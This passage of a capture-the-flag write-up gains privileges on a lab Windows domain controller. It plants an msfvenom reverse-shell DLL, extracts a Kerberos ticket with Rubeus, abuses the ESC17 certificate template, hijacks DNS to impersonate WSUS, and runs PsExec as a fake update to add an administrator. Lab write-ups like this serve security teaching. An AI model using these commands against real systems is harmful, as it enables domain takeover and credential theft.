The line that matters is the second BUILTIN\Users entry: `BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)`. Those rights on a directory mean:

- `WD` = Create files / write data
- `AD` = Create folders / append data
- `WEA` = write extended attributes
- `WA` = write attributes

`WD` is the one that lets me create this file.

I’ll create a DLL using `msfvenom`:

```console
oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.243 LPORT=443 -f dll -o settings_update.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: settings_update.dll
```

I’ll put it into a Zip:

```console
oxdf@hacky$ zip Settings_Update.zip settings_update.dll
  adding: settings_update.dll (deflated 80%)
```

And upload it to Logging:

```console
evil-winrm-py PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip Settings_Update.zip
Uploading /home/oxdf/hackthebox/logging-10.129.245.130/Settings_Update.zip: 100%|█████████████| 1.96k/1.96k [00:00<00:00, 30.8kB/s]
[+] File uploaded successfully as: C:\ProgramData\UpdateMonitor\Settings_Update.zip
```

The first time I tried this, nothing happened, and this showed up in `C:\ProgramData\UpdateMonitor\Logs\monitor.log`:

```plaintext
[2026-07-11 02:32:16] Starting Sentinel Update Check...
[2026-07-11 02:32:16] Checking for update on core server...
[2026-07-11 02:32:16] Info: Core did not find file Settings_Update.zip
[2026-07-11 02:32:16] Last status: File not found on core
[2026-07-11 02:32:16] Checking for update on local server...
[2026-07-11 02:32:16] Update failed: Access to the path 'C:\ProgramData\UpdateMonitor\Settings_Update.zip' is denied.
[2026-07-11 02:32:16] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-07-11 02:32:16] Failed to load settings_update.dll. Error code: 126
[2026-07-11 02:32:16] Update check completed.
```

The access-denied error makes sense. The update program runs as jaylee.clifton, but I created the zip from my msa_health$ shell, so jaylee has no rights to read it. Because the zip is never read, the DLL is never extracted, and the follow-on `Error code: 126` (`ERROR_MOD_NOT_FOUND`) is just the program failing to load a `settings_update.dll` that doesn’t exist yet. I’ll grant jaylee.clifton read access on the file:

```console
evil-winrm-py PS C:\ProgramData\UpdateMonitor> icacls Settings_Update.zip /grant "logging\jaylee.clifton:R"
processed file: Settings_Update.zip
Successfully processed 1 files; Failed processing 0 files
```

The next time I ran, more errors:

```plaintext
[2026-07-11 02:38:16] Starting Sentinel Update Check...
[2026-07-11 02:38:16] Checking for update on core server...
[2026-07-11 02:38:16] Info: Core did not find file Settings_Update.zip
[2026-07-11 02:38:16] Last status: File not found on core
[2026-07-11 02:38:16] Checking for update on local server...
[2026-07-11 02:38:16] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-07-11 02:38:16] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-07-11 02:38:16] Failed to load settings_update.dll. Error code: 193
[2026-07-11 02:38:16] Update check completed.
```

Error 193 = `ERROR_BAD_EXE_FORMAT`, which suggests I’m giving it a 64-bit library, but it needs a 32-bit DLL.

I’ll re-create the payload:

```console
oxdf@hacky$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.243 LPORT=443 -f dll -o settings_update.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
Saved as: settings_update.dll
oxdf@hacky$ zip Settings_Update.zip settings_update.dll
updating: settings_update.dll (deflated 82%)
```

And upload it and grant permissions:

```console
evil-winrm-py PS C:\ProgramData\UpdateMonitor> rm Settings_Update.zip
evil-winrm-py PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip Settings_Update.zip
Uploading /home/oxdf/hackthebox/logging-10.129.245.130/Settings_Update.zip: 100%|█████████████| 1.78k/1.78k [00:00<00:00, 21.8kB/s]
[+] File uploaded successfully as: C:\ProgramData\UpdateMonitor\Settings_Update.zip
evil-winrm-py PS C:\ProgramData\UpdateMonitor> icacls Settings_Update.zip /grant "logging\jaylee.clifton:R"
processed file: Settings_Update.zip
Successfully processed 1 files; Failed processing 0 files
```

The next time the ScheduledTask runs, I get a shell:

```console
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.245.130 61799
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

I’ll grab `user.txt`:

```console
C:\Users\jaylee.clifton\Desktop>type user.txt
9afbd68c************************
```

## Shell as system

### Enumeration

#### Filesystem

jaylee.clifton’s home directory is relatively empty, other than an HTML file in `Documents\Tickets`:

```console
PS C:\Users\jaylee.clifton\Documents\Tickets> ls

    Directory: C:\Users\jaylee.clifton\Documents\Tickets

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/16/2026   7:27 PM           2453 Incident_4922_WSUS_Remediation_ViewExport.html
```

I’ll download a copy (I copied it to `\programdata\` and then used my `evil-winrm-py` shell and `download`).

![image-20260711102307791](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260711102307791.png)

This describes a “recent” incident with a migration to a new WSUS server. There’s a temporary server at `wsus.logging.htb`. I can check that the host is still configured that way:

```console
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"

AcceptTrustedPublisherCerts        : 1
WUServer                           : https://wsus.logging.htb:8531
WUStatusServer                     : https://wsus.logging.htb:8531
UpdateServiceUrlAlternate          : https://wsus.logging.htb:8531
SetProxyBehaviorForUpdateDetection : 0
PSPath                             : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft
                                     \Windows\WindowsUpdate
PSParentPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft
                                     \Windows
PSChildName                        : WindowsUpdate
PSDrive                            : HKLM
PSProvider                         : Microsoft.PowerShell.Core\Registry
```

It also says that the DNS is not updated, which effectively means this won’t work. I can’t ping this host:

```console
PS C:\> ping wsus.logging.htb
Ping request could not find host wsus.logging.htb. Please check the name and try again.
```

Finally, it is resetting the WSUS server every 2 minutes. This would make no sense in the real world, but it’s useful to me if I want to exploit the server to not have to wait hours for the natural WSUS cycle.

#### ADCS

BloodHound shows that jaylee.clifton is a member of the IT group, which has Enroll rights for the `UPDATESRV` certificate in Active Directory Certificate Services (ADCS):

![image-20260711155224119](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260711155224119.png)

At this point I have command execution as jaylee.clifton through the reverse shell, but not the account’s password or hash, so I can’t authenticate as jaylee from my own machine. I’ll grab a copy of [Rubeus](https://github.com/ghostpack/rubeus) from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rubeus.exe) and upload it. `tgtdeleg` abuses the Kerberos GSS-API to extract a usable TGT for the current user, which I can take back to my box and use for Kerberos auth:

```console
PS C:\programdata> .\Rubeus.exe tgtdeleg /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: fdfNCUCKqYtvCh/h40NjgmKUWApvAI/hWC3eh1VGqqg=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRucOY8huKSOqFZtGW14x9vHDcpUUVltSmRAfUC3ns3J7FKS39ag0lv5vvP1ioG7nrelagO+j0sNoqgaC78zu8Y5D0ikLmK0ZcVF/f0WEyxNcRsxbcr9hLoXAI70Q0u63t1hcG+l91ZVkVEDYwhzg7Z5IkJJ+RTUtmR5Dgd2XZ6YdHyfe/GyIXvzZwleu1sp3Acm1lk8xKLGq+FAf0djnfuWv0qO/Egsu5VLdfIjV2RMu+ioNdquAFFtkJdYNK5r5gEu54br05r+8U8zYjVHgd01dZNc+IXFZiwUAASJedI3icGGtzWfIsI4YKmiUsoxFjBsXEpJ5+LdsYUbYKD7GWuqWHBtYf3dNkHc0KeXPAcoSoenJoNorrIftSIh/gASx7Mms77Pg9BJzf7iStdsFDQv3TEEpmUo/O36dLyvmVkJ6Apx8pEvC/VIVs2nWl6hIWIHXTPQ2NJAOZeAsa2CjV0h4SJOnj+RnNcNpO1uikXW3nKX5QHJ0enyj9YH3+sJLB0jIYVG4DWREC7YQ0v8rPA5t2otzX95LiGawkslhxf8A9i5fjPBmY3BAXm4ym1PcPdwc61E/MK4cMJ9dKUJo9Wix+W2R/9AR5478jJs+j/9CYPY/Y+7W3Oha50FYmtW36EoO6EM/sFuedRL4fa0pVd5X8F2E6Xn5NhDCSsDnABtqE4qmshNIYalVpUr9bBgcEV76iEt7er4uvEemW55Xr3Btbsih+xGoW7752EUy0gQaz1Xdml87IET71XO8XaQWBSeTZMKs1qiM300JBk8lFewmme2iG4NTWbK2S10qGPleppLLTtxw5W+49USc7jyM/s4BBmaR5JT+MxOOnHqnnZ+Zw9kVANLzJAwTPqiP0V/202VTdv17DokBMutBjWjbBUDUhK5ELP4wtKdHS8/fg2R7SzPDHKi7suCTOiNXUGirHSBjnEfaIlpWXS/z2E/Bs+jeJ/e3eC/6E00ymg4IRNYNhOy3cCWZdJmDH27ByQrBHItfqA0ZT+pdM72GgbP1a0nAdlDRjpv+XfAxpGRRa3tAU1BMclRMIgln2xtZlnvDE8bNkMmrYPgNPaFDp6o1V/zYnbYx3YAhGOghW32ObNjnnCwMbBCXry8CYJ8epHvbnpqumKJD4varHveOZwIXvwduVzMU0HFsiIk6Ky013FuB1KNhNlLdoxLu3ZpXXOyub39bFzUf+wh8831ePqG6SXQhsAfez+qUC8oaJmztR4PPH0IXduKnRpI0hh+LfBty9j5cvvpyRQOHRyC9cbswir8ETyKZ7z24FW4LUrevwGy1g683VdWkSElIhHkDZvNEhCtfVR3bGea+Z3bEcU5cBKj5rdvoBJLBpnIGV0MzQzaq2zLRKxp5exKYtrxu9aqjpfeyYxuGPQ4quCK+WqtW8VP2Mwo22j2MmZwrR1gF8zgs0cSGNDRhzdfnymo0zikgrWCGYBAaP9xb+o0P8mEAiYybCa2jA24ID7eUKb4BM+BRCLs+ajvkM/v2WZjs6no4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgg78IxET+CIeGtK2xrz3QFFR9Nj2kpPLrG/1/wT0R7iWhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDcxMjAzMDk1OVqmERgPMjAyNjA3MTIwNTMyMTVapxEYDzIwMjYwNzE4MDk0NzE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=
```

I’ll base64-decode that ticket, save that to a file on my VM, and convert it to CCACHE format:

```console
oxdf@hacky$ echo "doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRucOY8huKSOqFZtGW14x9vHDcpUUVltSmRAfUC3ns3J7FKS39ag0lv5vvP1ioG7nrelagO+j0sNoqgaC78zu8Y5D0ikLmK0ZcVF/f0WEyxNcRsxbcr9hLoXAI70Q0u63t1hcG+l91ZVkVEDYwhzg7Z5IkJJ+RTUtmR5Dgd2XZ6YdHyfe/GyIXvzZwleu1sp3Acm1lk8xKLGq+FAf0djnfuWv0qO/Egsu5VLdfIjV2RMu+ioNdquAFFtkJdYNK5r5gEu54br05r+8U8zYjVHgd01dZNc+IXFZiwUAASJedI3icGGtzWfIsI4YKmiUsoxFjBsXEpJ5+LdsYUbYKD7GWuqWHBtYf3dNkHc0KeXPAcoSoenJoNorrIftSIh/gASx7Mms77Pg9BJzf7iStdsFDQv3TEEpmUo/O36dLyvmVkJ6Apx8pEvC/VIVs2nWl6hIWIHXTPQ2NJAOZeAsa2CjV0h4SJOnj+RnNcNpO1uikXW3nKX5QHJ0enyj9YH3+sJLB0jIYVG4DWREC7YQ0v8rPA5t2otzX95LiGawkslhxf8A9i5fjPBmY3BAXm4ym1PcPdwc61E/MK4cMJ9dKUJo9Wix+W2R/9AR5478jJs+j/9CYPY/Y+7W3Oha50FYmtW36EoO6EM/sFuedRL4fa0pVd5X8F2E6Xn5NhDCSsDnABtqE4qmshNIYalVpUr9bBgcEV76iEt7er4uvEemW55Xr3Btbsih+xGoW7752EUy0gQaz1Xdml87IET71XO8XaQWBSeTZMKs1qiM300JBk8lFewmme2iG4NTWbK2S10qGPleppLLTtxw5W+49USc7jyM/s4BBmaR5JT+MxOOnHqnnZ+Zw9kVANLzJAwTPqiP0V/202VTdv17DokBMutBjWjbBUDUhK5ELP4wtKdHS8/fg2R7SzPDHKi7suCTOiNXUGirHSBjnEfaIlpWXS/z2E/Bs+jeJ/e3eC/6E00ymg4IRNYNhOy3cCWZdJmDH27ByQrBHItfqA0ZT+pdM72GgbP1a0nAdlDRjpv+XfAxpGRRa3tAU1BMclRMIgln2xtZlnvDE8bNkMmrYPgNPaFDp6o1V/zYnbYx3YAhGOghW32ObNjnnCwMbBCXry8CYJ8epHvbnpqumKJD4varHveOZwIXvwduVzMU0HFsiIk6Ky013FuB1KNhNlLdoxLu3ZpXXOyub39bFzUf+wh8831ePqG6SXQhsAfez+qUC8oaJmztR4PPH0IXduKnRpI0hh+LfBty9j5cvvpyRQOHRyC9cbswir8ETyKZ7z24FW4LUrevwGy1g683VdWkSElIhHkDZvNEhCtfVR3bGea+Z3bEcU5cBKj5rdvoBJLBpnIGV0MzQzaq2zLRKxp5exKYtrxu9aqjpfeyYxuGPQ4quCK+WqtW8VP2Mwo22j2MmZwrR1gF8zgs0cSGNDRhzdfnymo0zikgrWCGYBAaP9xb+o0P8mEAiYybCa2jA24ID7eUKb4BM+BRCLs+ajvkM/v2WZjs6no4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgg78IxET+CIeGtK2xrz3QFFR9Nj2kpPLrG/1/wT0R7iWhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDcxMjAzMDk1OVqmERgPMjAyNjA3MTIwNTMyMTVapxEYDzIwMjYwNzE4MDk0NzE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=" | base64 -d > jaylee.clifton.kirbi
oxdf@hacky$ ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

Now I can use `certipy` to look for vulnerable certificates:

```console
oxdf@hacky$ KRB5CCNAME=jaylee.clifton.ccache certipy find -k -target DC01.logging.htb -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.logging.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'logging-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'logging-DC01-CA'
[*] Checking web enrollment for CA 'logging-DC01-CA' @ 'DC01.logging.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : logging-DC01-CA
    DNS Name                            : DC01.logging.htb
    Certificate Subject                 : CN=logging-DC01-CA, DC=logging, DC=htb
    Certificate Serial Number           : 1E4F7EC9F5F17EA34E246D856D6C0C83
    Certificate Validity Start          : 2026-04-24 16:40:56+00:00
    Certificate Validity End            : 2126-04-24 16:50:56+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : LOGGING.HTB\Administrators
      Access Rights
        ManageCa                        : LOGGING.HTB\Administrators
                                          LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        ManageCertificates              : LOGGING.HTB\Administrators
                                          LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Enroll                          : LOGGING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UpdateSrv
    Display Name                        : UpdateSrv
    Certificate Authorities             : logging-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-04-17T00:41:06+00:00
    Template Last Modified              : 2026-04-17T00:41:07+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOGGING.HTB\IT
                                          LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOGGING.HTB\Administrator
        Full Control Principals         : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Owner Principals          : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Dacl Principals           : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Property Enroll           : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOGGING.HTB\IT
    [!] Vulnerabilities
      ESC17                             : Enrollee supplies subject and template allows server authentication.
    [*] Remarks
      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

It finds `UpdateSrv` is vulnerable to ESC17. This only comes back because I ran with a user in the IT group, and that’s who has user enrollable principals.

### Rogue WSUS Server

#### DNS Hijack

To be able to impersonate the WSUS server, I’ll need to be able to set the DNS value to my IP. I’ll check with `bloodyAD`:

```console
oxdf@hacky$ KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host dc01.logging.htb -d logging.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=jaylee.clifton,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

Those last two show that I can!

I’ll set it to my IP:

```console
oxdf@hacky$ KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host dc01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.15.243
[+] wsus has been successfully added
```

From my shell I can verify it worked:

```console
PS C:\programdata> nslookup wsus.logging.htb
nslookup wsus.logging.htb
Server:  localhost
Address:  127.0.0.1

Name:    wsus.logging.htb
Address:  10.10.15.243
```

If I listen on both 8530 and 8531, within two minutes, there’s a connection on 8531:

```console
oxdf@hacky$ python -m http.server 8531
Serving HTTP on 0.0.0.0 port 8531 (http://0.0.0.0:8531/) ...
10.129.245.130 - - [12/Jul/2026 03:43:35] code 400, message Bad request version ("þ\\x00\\x00*À,À+À0À/\\x00\\x9f\\x00\\x9eÀ$À#À(À'À")
10.129.245.130 - - [12/Jul/2026 03:43:35] "\x16\x03\x03\x00Â\x01\x00\x00¾\x03\x03jS\x0dh\x1f\x17KN\x9eEº³\x83ãS\x80{Ì#7zJA+d±\x978%¬\x1fþ\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À" 400 -
10.129.245.130 - - [12/Jul/2026 03:43:37] code 400, message Bad request version ("ÎÛçÒô~i\\x8eÀ\\x89s§LÓjÔùÒvóÿ\\x00I\\x14ø\\x00\\x00*À,À+À0À/\\x00\\x9f\\x00\\x9eÀ$À#À(À'À")
10.129.245.130 - - [12/Jul/2026 03:43:37] "\x16\x03\x03\x00Â\x01\x00\x00¾\x03\x03jS\x0djyv ÎÛçÒô~i\x8eÀ\x89s§LÓjÔùÒvóÿ\x00I\x14ø\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À" 400 -
10.129.245.130 - - [12/Jul/2026 03:43:39] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x03\\x00Â\\x01\\x00\\x00¾\\x03\\x03jS')
10.129.245.130 - - [12/Jul/2026 03:43:39] "\x16\x03\x03\x00Â\x01\x00\x00¾\x03\x03jS\x0dlIôêa\x84uÁÌm×E@\x9c7\x17hÄ\x8cáï^5µÅ\x8cã8\x95\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À" 400 -
```

That’s a connection on the TLS WSUS port.

#### ESC17

In order to have the WSUS server trust my host, it will need a TLS certificate that matches two conditions:

1. The certificate chains to a trusted CA. On a domain-joined box (especially the DC), the enterprise AD CS root is already in the trusted root store.
2. The certificate’s subject/SAN must be the host it is making a connection to.

ESC17 involves a user being able to enroll with an arbitrary DNS name in the SAN field. From the [certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication):

> In the CSR, they can specify an arbitrary DNS name in the SAN (e.g., `wsus.corp.local`). The CA, trusting the template’s insecure configuration, issues a certificate that appears to belong to the specified DNS name. The attacker can then use this certificate to impersonate a legitimate server, e.g., the internal WSUS server used for distribution of Windows updates.

This seems like a really good fit for this scenario. Later it gives details on exploitation:

> Exploiting an ESC17 vulnerability typically involves three main steps:  Identifying a service that the attacker can impersonate (e.g., WSUS) and that provides some kind of advantage when impersonated (e.g., relaying or serving malicious updates). Requesting a certificate using the vulnerable template, injecting the identity of a server to be impersonated. Using the obtained certificate to impersonate the server and attack the actual target.

Because the enrollee provides the subject, I can get a certificate that’s trusted with whatever name I want.

To abuse ESC17, I request a certificate specifying the SAN with the `-dns` flag:

```console
oxdf@hacky$ KRB5CCNAME=jaylee.clifton.ccache certipy req -k -target DC01.logging.htb -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC01.logging.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: LOGGING.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'wsus.pfx'
[*] Wrote certificate and private key to 'wsus.pfx'
oxdf@hacky$ openssl pkcs12 -in wsus.pfx -nodes -passin pass: -out wsus.pem
```

The `Certificate has no object SID` warning is fine in this case. That SID matters when a certificate is used to authenticate as a user, but here I only need the certificate to prove I’m the WSUS server over TLS, which is server authentication and doesn’t depend on a SID.

`certipy` saves the certificate and key as a `.pfx`, so I convert it to a `.pem`, which is the format `wsuks` expects for its TLS certificate.

#### Fake WSUS

I’ll use [wsuks](https://github.com/NeffIsBack/wsuks) to host a fake WSUS server (which took a bit of hacking to make work under `uv`, but I did manage). In theory, the default mode should create a user and add it to the local administrators group, but I didn’t get that to work. Instead, I’ll just have it run my own command using the following options:

- `-t DC01.logging.htb` - The target is DC01.logging.htb.
- `--WSUS-Server wsus.logging.htb` - The WSUS server I’m impersonating.
- `--tls-cert wsus.pem` - The TLS certificate to use.
- `-I tun0` - Only worry about the `tun0` interface.
- `--serve-only` - Don’t bother with DNS poisoning, just wait for traffic.
- `-c '/accepteula /s cmd /k "net localgroup administrators /add wallace.everette"'` - The command to run, adding the initial user to the administrators group.

WSUS clients will only install updates that are signed by Microsoft, so I can’t just serve an arbitrary executable. The trick `wsuks` uses is to serve Microsoft’s own signed `PsExec64.exe` as the update, which passes the signature check, and then hand it arguments to run a command of my choosing as SYSTEM. That’s why the `-c` value above is a set of PsExec arguments rather than a raw command.

I’ll run this, and after a minute or so, there’s a connection:

```console
oxdf@hacky$ sudo wsuks -t DC01.logging.htb --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s cmd /k "net localgroup administrators /add wallace.everette"'

    __          __ _____  _    _  _  __  _____
    \ \        / // ____|| |  | || |/ / / ____|
     \ \  /\  / /| (___  | |  | || ' / | (___
      \ \/  \/ /  \___ \ | |  | ||  <   \___ \
       \  /\  /   ____) || |__| || . \  ____) |
        \/  \/   |_____/  \____/ |_|\_\|_____/

     Pentesting Tool for the WSUS MITM Attack
               Made by NeffIsBack
                 version: 1.2.1

[+] Command to execute:
PsExec64.exe /accepteula /s cmd /k "net localgroup administrators /add wallace.everette"
[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 10.10.15.243:8531...
[*] Serving executable as KB: 3062586
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"
[+] Received GET request: /b969db6d-5ae8-4017-8e8e-8c16605aee45/PsExec64.exe
[+] GET request for exe: /b969db6d-5ae8-4017-8e8e-8c16605aee45/PsExec64.exe
[+] Received GET request: /b969db6d-5ae8-4017-8e8e-8c16605aee45/PsExec64.exe
[+] GET request for exe: /b969db6d-5ae8-4017-8e8e-8c16605aee45/PsExec64.exe
[+] Received POST request: /ReportingWebService/ReportingWebService.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"
```

It seems to have worked.

### Shell

I’ll check if the WSUS attack worked by checking wallace.everette’s access with `netexec`:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)
```

`(Pwn3d!)` means it has administrative access.

I’ll use `evil-winrm-py` to get a shell:

```console
oxdf@hacky$ evil-winrm-py -i DC01.logging.htb -u wallace.everette -p Welcome2026@
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.logging.htb:5985' as 'wallace.everette'
evil-winrm-py PS C:\Users\wallace.everette\Documents>
```

For some reason, the `root.txt` is on the Desktop of toby.brynleigh:

```console
evil-winrm-py PS C:\Users\toby.brynleigh\Desktop> cat root.txt
6e8bafcc************************
```

I can also use `psexec.py` if I want a shell as System:

```console
oxdf@hacky$ psexec.py logging/wallace.everette:'Welcome2026@'@DC01.logging.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC01.logging.htb.....
[*] Found writable share ADMIN$
[*] Uploading file tyPiXFxT.exe
[*] Opening SVCManager on DC01.logging.htb.....
[*] Creating service GyaD on DC01.logging.htb.....
[*] Starting service GyaD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
